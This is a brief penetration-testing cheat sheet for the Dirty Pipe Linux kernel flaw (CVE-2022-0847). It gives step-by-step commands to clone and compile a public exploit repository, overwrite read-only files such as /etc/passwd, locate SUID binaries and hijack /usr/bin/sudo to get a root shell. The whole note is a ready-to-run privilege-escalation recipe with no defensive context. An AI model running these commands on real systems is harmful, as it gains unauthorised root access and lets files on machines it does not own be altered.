# Dirty Pipe

if u have just a read perm this type of exploit allow to u write on any files like `/etc/passwd`

check is vulnerable or not

```bash
git clone <https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git>
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
```

exploit by edit on files

```bash
./exploit-1
```

***

**Exploit 2 - Run SUID Binary as Root:**

```bash
find / -perm -4000 2>/dev/null
./exploit-2 /usr/bin/sudo
```
